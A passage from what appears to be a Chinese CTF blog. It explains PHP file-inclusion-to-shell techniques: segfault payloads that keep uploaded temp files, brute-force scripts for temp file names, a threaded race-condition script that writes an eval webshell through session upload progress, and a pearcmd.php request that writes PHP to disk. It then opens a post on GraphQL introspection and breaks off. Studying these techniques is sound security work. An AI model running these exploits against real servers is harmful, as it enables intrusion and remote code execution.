/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后上传一个我们想要执行代码的php文件</p><p>我们抓包来看一看</p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004Content-Length: 380Origin: nullConnection: closeCookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteSec-Fetch-User: ?1-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;file&quot;C:\Windows\php&lt;&lt;-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;Content-Type: application/octet-stream&lt;?phpecho md5(1);-----------------------------176135873113704889614062296004--</code></pre><p>然后多发几次</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130191917085.png" alt="image-20221130191917085"></p><p>我们可以看到成功执行了我们发送的恶意文件代码，成功率还是相当之高的</p><h3 id="LFI-php7-Segment-Fault-Getshell"><a href="#LFI-php7-Segment-Fault-Getshell" class="headerlink" title="LFI + php7 Segment Fault Getshell"></a>LFI + php7 Segment Fault Getshell</h3><p> 段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了<strong>tmp目录</strong><br> 向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p><strong>让PHP异常崩溃的payload：</strong><br>7.0.0 &lt;=  php &lt;  7.1.20</p><pre><code class="php">php://filter/string.strip_tags/resource=/etc/passwd</code></pre><p>php7 老版本通杀</p><pre><code class="php">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p><strong>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除,这样就能达成getshell的目的</strong></p><p><strong>windows复现</strong></p><p>我们在请求的同时post一个文件</p><pre><code class="php">POST /index.php?file=php://filter/string.strip_tags/resource=index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004Content-Length: 216Origin: nullConnection: closeCookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteSec-Fetch-User: ?1-----------------------------176135873113704889614062296004Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;&lt;?phpphpinfo();?&gt;-----------------------------176135873113704889614062296004--</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200709385.png" alt="image-20221130200709385"></p><p>然后我们来查看一下目录:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200817102.png" alt="image-20221130200817102"></p><p>这个文件确实保留在了服务器当中,现在假设我们知道了它的名字，来尝试包含它</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200947378.png" alt="image-20221130200947378"></p><p>good!成功包含</p><p>如果我们不知道它的名字呢?那就只能爆破了,但是我们可以多上传一些这种文件，来增加爆破成功的几率</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130201135494.png" alt="image-20221130201135494"></p><p>好，我们来写个脚本来爆破，只有第4-7位是未知的，所以windows相对来说更好爆破</p><p>爆破脚本:</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.ascii_letters  # 最好是多发几个，然后只取数字和字母不然效率真的很低host = &quot;127.0.0.1&quot;port = 80base_url = &quot;http://%s:%d&quot; % (host, port)def brute_force_tmp_files():    for i in charset:        for j in charset:            for k in charset:                for l in charset:                        filename = i + j + k + l                        url = &quot;%s/index.php?file=C:/windows/php%s&quot; % (                            base_url, filename)+&quot;.tmp&quot;                        print (url)                        try:                            response = requests.get(url)                            if &#39;flag&#39; in response.text:                                print (&quot;[+] Include success!&quot;)                                return True                        except Exception as e:                            print (e)    return Falsedef main():    brute_force_tmp_files()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130202336196.png" alt="image-20221130202336196"></p><p>就这样跑下去</p><p>不过的话这样跑起来实在是太慢了,我们可以多发点包，然后呢，只取数字或者字母(经常测试会生成不少这样的tmp文件)，这样的话范围大大缩小，效率也提高了不少.</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203124465.png" alt="image-20221130203124465"></p><p>如图，我们很快就跑了出来，来包含一下</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203214124.png" alt="image-20221130203214124"></p><p>成功包含! 还是很有实战意义的</p><p><strong>Linux复现</strong></p><p>Linux其实也是一样的，不过与windows不同</p><pre><code> linux生成的文件是  php+六位随机数字字母 如:/tmp/php5H1Lku</code></pre><p>所以爆破难度实质上增加了不少，脚本我们也改一改就能用，建议实战的时候多发点包来增加成功率</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.lettershost = &quot;192.168.1.9&quot;port = 8000base_url = &quot;http://%s:%d&quot; % (host, port)def brute_force_tmp_files():    for i in charset:        for j in charset:            for k in charset:                for l in charset:                    for m in charset:                        for n in charset:                            filename = i + j + k + l + m + n                            url = &quot;%s/index.php?orange=/tmp/php%s&quot; % (                                base_url, filename)                            print url                            try:                                response = requests.get(url)                                if &#39;flag&#39; in response.content:                                    print &quot;[+] Include success!&quot;                                    return True                            except Exception as e:                                print e    return Falsedef main():    brute_force_tmp_files()if __name__ == &quot;__main__&quot;:    main()</code></pre><h3 id="利用session进行文件包含来getshell"><a href="#利用session进行文件包含来getshell" class="headerlink" title="利用session进行文件包含来getshell"></a>利用session进行文件包含来getshell</h3><p><strong>SESSION会话存储方式</strong></p><p>在<code>Java</code>中，用户的session是存储在内存中的，而在<code>PHP</code>中，则是将session以文件的形式存储在服务器某个文件中，我们可以在<code>php.ini</code>里面设置<code>session</code>的存储位置<code>session.save_path</code></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129151954937.png" alt="image-20221129151954937"></p><p>在很多时候服务器都是按照默认设置来运行的，假如我们发现了一个没有安全措施的<code>session</code>文件包含漏洞时，我们就可以尝试利用默认的会话存放路径去包含<code>getshell</code>，因此总结常见的<code>php-session</code>的默认存储位置是很有必要的</p><p><strong>默认路径</strong></p><pre><code class="php">/var/lib/php/sess_PHPSESSID/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre><blockquote><blockquote><p><code>session</code>文件的存储路径是分为两种情况的</p><p>一是没有权限，默认存储在<code>/var/lib/php/sessions/</code>目录下，文件名为<code>sess_[phpsessid]</code>，而<code>phpsessid</code>在发送的请求的<code>cookie</code>字段中可以看到（一般在利用漏洞时我们自己设置<code>phpsessid</code>）</p><p>二是<code>phpmyadmin</code>，这时的<code>session</code>文件存储在<code>/tmp</code>目录下，需要在<code>php.ini</code>里把<code>session.auto_start</code>置为1，把<code>session.save_path</code>目录设置为<code>/tmp</code></p></blockquote></blockquote><p><strong>涉及到的函数</strong></p><p>1.Session Upload Progress</p><p>默认情况下是开启的</p><p><code>Session Upload Progress</code> 即 Session 上传进度，是<code>php&gt;=5.4</code>后开始添加的一个特性。官网对他的描述是当 <code>session.upload_progress.enabled</code> 选项开启时（默认开启），PHP 能够在每一个文件上传时 <strong>监测上传进度</strong>。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个<code>POST</code>请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在 <code>$_SESSION</code> 中获得。 当PHP检测到这种POST请求时，它会在 <code>$_SESSION</code> 中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 连接在一起的值。</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153107918.png" alt="image-20221129153107918"></p><p>2.session.upload_progress.cleanup</p><p>Cleanup the progress information as soon as all POST data has been read  (i.e. upload completed). Defaults to 1, enabled.  一旦POST请求被读取完成,session内容就会被清空</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153427709.png" alt="image-20221129153427709"></p><hr><p><strong>配置环境</strong></p><p>index.php</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>然后我们来监控下session目录</p><pre><code>inotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /var/lib/php/sessions/</code></pre><p><strong>攻击流程</strong></p><p>1.构造上传表单</p><pre><code class="html">&lt;form action=&quot;http://193.43.142.8/sakura.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo();?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>我们上传个文件来测试一下,随便选一个文件就好</p><blockquote><p>1.首先构造的表单里面是没有cookie的，所以要自己加上一个cookie，phpsessid随便设置一个就可以，他会创建名为sess_PHPSESSID的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。所以要知道文件名才能包含</p><p>2.当同时POST一个与session.upload_process.name的同名变量也就是PHP_SESSION_UPLOAD_PROGRESS。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。通俗说就是会把内容序列化传入到session储存的文件中。</p></blockquote><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129221724271.png" alt="image-20221129221724271"></p><p>我们可以看到已经产生sess_phpsessid文件了</p><p>2.包含phpsessid文件Getshell(关闭session.upload_progress.cleanup)</p><p>我们先来查看一下里面的内容,但是里面什么都没有</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129222707579.png" alt="image-20221129222707579"></p><p>因为<code>session.upload_progress.cleanup</code>开启,读取完post内容时,session内容就会清空,所以我们需要用到条件竞争,一直发送请求,然后一直包含。</p><p>我们先降低难度，把<code>session.upload_progress.cleanup</code>关闭来包含</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129223936145.png" alt="image-20221129223936145"></p><p>来重新上传下文件</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224017844.png" alt="image-20221129224017844"></p><p>此时session里的内容并没有被删除</p><p>我们来包含一下</p><pre><code class="php">http://193.43.142.8/sakura.php?file=/var/lib/php/sessions/sess_uhbrr6s4fchgssstv9n8nbua0a</code></pre><p>很显然我们包含成功了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224159121.png" alt="image-20221129224159121"></p><p>3.包含phpsessid文件Getshell(开启session.upload_progress.cleanup)</p><p>好的，那么接下来我们重新打开这个配置,然后将session置空，那么我们该如何包含这个迅速被置空的session文件呢?</p><p>我们可以来利用条件竞争，简单来说就是我一边发包上传文件，一边去包含这个session文件，那么总有一个时间包含这个文件的操作是在清空session文件内容操作之前的!</p><p>我们来操作一下，使用burp即可！</p><p>我们分别抓一个上传文件的数据包，和一个文件包含的数据包,payload设置为空即可</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129225355419.png" alt="image-20221129225355419"></p><p>然后我将上传文件的数据包设置为2500条，文件包含的数据包设为5000条</p><p>好，let’s hack it!</p><p>如图,已经成功包含了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230017592.png" alt="image-20221129230017592"></p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230055835.png" alt="image-20221129230055835"></p><p>除了用burp,我们还可以直接跑python脚本</p><pre><code class="python">import requestsimport ioimport threadingurl = &quot;http://193.43.142.8/sakura.php&quot;sessid = &quot;uhbrr6s4fchgssstv9n8nbua0a&quot;def write(session):    filebytes = io.BytesIO(b&#39;a&#39; * 1024 * 50)    while True:        res = session.post(url,                           data=&#123;                               &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;                           &#125;,                           cookies=&#123;                               &#39;PHPSESSID&#39;: sessid                           &#125;,                           files=&#123;                               &#39;file&#39;: (&#39;sakura.jpg&#39;, filebytes)                           &#125;                           )def read(session):    while True:        res = session.post(url + &quot;?file=/var/lib/php/sessions/sess_&quot; + sessid,                           data=&#123;                               &quot;1&quot;: &quot;file_put_contents(&#39;/var/www/html/HY.php&#39; , &#39;&lt;?php eval($_POST[hy666]);?&gt;&#39;);&quot;                           &#125;,                           cookies=&#123;                               &quot;PHPSESSID&quot;: sessid                           &#125;                           )        res2 = session.get(&quot;http://193.43.142.8/HY.php&quot;)        if res2.status_code == 200:            print(&quot;成功写入一句话！&quot;)        else:            print(&quot;Retry&quot;)if __name__ == &quot;__main__&quot;:    evnet = threading.Event()    with requests.session() as session:        for i in range(5):            threading.Thread(target=write, args=(session,)).start()        for i in range(5):            threading.Thread(target=read, args=(session,)).start()    evnet.set()</code></pre><p>自己根据脚本修改对应文件就好啦</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000436615.png" alt="image-20221130000436615"></p><p>然后直接使用蚁剑连接:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000707628.png" alt="image-20221130000707628"></p><h3 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a>pearcmd.php的巧妙利用</h3><p>这个点懒得搭环境了，就直接搬运了p神的文章</p><p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p><p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p><p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p><p>我们在PHP源码中可以看到这样的逻辑：</p><pre><code class="php">static zend_bool php_auto_globals_create_server(zend_string *name)&#123;    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),&#39;S&#39;) || strchr(PG(variables_order),&#39;s&#39;))) &#123;        php_register_server_variables();        if (PG(register_argc_argv)) &#123;            if (SG(request_info).argc) &#123;                zval *argc, *argv;                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) &#123;                    Z_ADDREF_P(argv);                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);                &#125;            &#125; else &#123;                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);            &#125;        &#125;    &#125; else &#123;        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);    &#125;    ...</code></pre><p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p><pre><code class="php">php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);</code></pre><p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p><p>果然：</p><p><a href="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></a></p><p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p><blockquote><p>4.4.  The Script Command Line</p><p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p><pre><code class="php">  search-string = search-word *( &quot;+&quot; search-word )  search-word   = 1*schar  schar         = unreserved | escaped | xreserved  xreserved     = &quot;;&quot; | &quot;/&quot; | &quot;?&quot; | &quot;:&quot; | &quot;@&quot; | &quot;&amp;&quot; | &quot;=&quot; | &quot;,&quot; |                  &quot;$&quot;</code></pre><p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p></blockquote><p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p><p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER[&#39;argv&#39;]</code>。</p><p>我们再来看到pear中获取命令行argv的函数：</p><pre><code class="php">public static function readPHPArgv()&#123;    global $argv;    if (!is_array($argv)) &#123;        if (!@is_array($_SERVER[&#39;argv&#39;])) &#123;            if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) &#123;                $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;                return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);            &#125;            return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];        &#125;        return $_SERVER[&#39;argv&#39;];    &#125;    return $argv;&#125;</code></pre><p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p><p>看看pear中有哪些可以利用的参数：</p><p><a href="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png"><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></a></p><p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><p>所以，我构造出最后的利用数据包如下：</p><pre><code class="php">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1Host: 192.168.1.162:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205856136.png" alt="image-20221130205856136"></p><p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205909317.png" alt="image-20221130205909317"></p><p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130205927264.png" alt="image-20221130205927264"></p><p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/201060?display=mobile">https://www.anquanke.com/post/id/201060?display=mobile</a></p><p><a href="https://xz.aliyun.com/t/5535#toc-5">https://xz.aliyun.com/t/5535#toc-5</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106498971">https://blog.csdn.net/qq_45521281/article/details/106498971</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><p><a href="http://tttang.com/archive/1312/#toc_0x06-pearcmdphp">http://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GraphQL注入</title>
      <link href="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="什么是GraphQL注入"><a href="#什么是GraphQL注入" class="headerlink" title="什么是GraphQL注入"></a>什么是GraphQL注入</h1><p> GraphQL 是一个用于API的查询语言，使用基于类型系统来执行查询的服务（类型系统由你的数据定义）。GraphQL 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。  </p><p>GraphQL中文文档·<br><a href="https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md">https://www.bookstack.cn/read/graphql-zh/ec2f2575c49a7954.md</a></p><p>如果你了解REST API会更快地了解它。像REST API，往往我们的请求需要多个API，每个API是一个类型。比如：<a href="http://www.test.com/users/%7Bid%7D">http://www.test.com/users/{id}</a> 这个API可以获取用户的信息；再比如：<a href="http://www.test.com/users/list">http://www.test.com/users/list</a> 这个API可以获取所有用户的信息。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667712995992-b10557ca-bcfa-43db-9f95-0be55e75ef24.png" alt="beepress-image-148242-1606793579.png"><br>比如查id为1的一个人的生日，可以这么查：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713213304-3dacaa0d-be46-40fe-ab15-85b80e942f97.png" alt="image.png"><br>再想知道他的身高、发色可以这样：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713274716-35f75660-d364-4bcd-a3bd-3a02762bf2ca.png" alt="image.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713351193-121bd2cb-54fa-41d8-b40a-a030ab5408de.png" alt="image.png"><br>通过上面这个例子就可以看出graphql与REST API的区别，仅用一个API即可完成所有的查询操作。并且他的语法和结构都是以一个对象不同属性的粒度划分，简单好用。</p><h1 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h1><p>GraphQL的执行逻辑大致如下：<br>查询-&gt;解析-&gt;验证-&gt;执行<br>根据官方文档，主要的操作类型有三种：query（查询）、mutation（变更）、subscription（订阅），最常用的就是query，所有的查询都需要操作类型，除了简写查询语法。<br>类型语言TypeLanguage，type来定义对象的类型和字段，理解成一个数据结构，可以无关实现graphQL的语言类型。类型语言包括Scalar（标量）和Object（对象）两种。并且支持接口抽象类型。<br>Schema用于描述数据逻辑，Schema就是对象的合计，其中定义的大部分为普通对象类型。一定包括query，可能包含mutation，作为一个GraphQL的查询入口。<br>Resolver用于实现解析逻辑，当一个字段被执行时，相应的 resolver 被调用以产生下一个值。</p><h1 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h1><p>简单来说就是，GraphQL内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。<br>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667713714820-cdfddfcf-655f-4c7d-9908-5664584bf387.png" alt="image.png"></p><ul><li><strong>Query, Character, Human, Episode, Droid</strong> - 这些是我们在类型系统中定义的类型。</li><li><strong>String, Boolean</strong> - 这些是内建的标量，由类型系统提供。</li><li><strong>__Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive</strong> - 这些有着两个下划线的类型是内省系统的一部分。</li></ul><p> 现在，来试试找到一个可以探索出有哪些可用查询的地方。当我们设计类型系统的时候，我们确定了一个所有查询开始的地方，来问问内省系统它是什么！<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667716706372-432567f7-169b-4329-8f68-e3896efbb8a3.png" alt="image.png"><br> 这和我们在类型系统那章里说的一样，Query 类型是我们开始的地方！注意这里的命名只是一个惯例，我们也可以把 Query 取成别的名字，只要我们把它定义为所有查询出发的地方，它也依然会在这里被返回。尽管如此，还是把它命名为 Query 吧，这是一个有用的惯例。<br> 有时候也需要检验一个特定的类型。来看看Film 类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717143389-b7204fa0-d0b6-4ccd-aa47-2d4df3c522ec.png" alt="image.png"><br>kind 返回一个枚举类型 __TypeKind，其中一个值是 OBJECT。<br>我们可以使用如下语法查询 Film有哪些字段:</p><pre><code class="plsql">&#123;__type(name:&quot;Film&quot;)&#123;  name  fields&#123;    name    type&#123;      name      kind      ofType&#123;        name        kind      &#125;    &#125;  &#125;&#125;&#125;</code></pre><p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667717378913-a48fa951-fa30-476e-8fe1-67dc352c8db4.png" alt="image.png"></p><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" 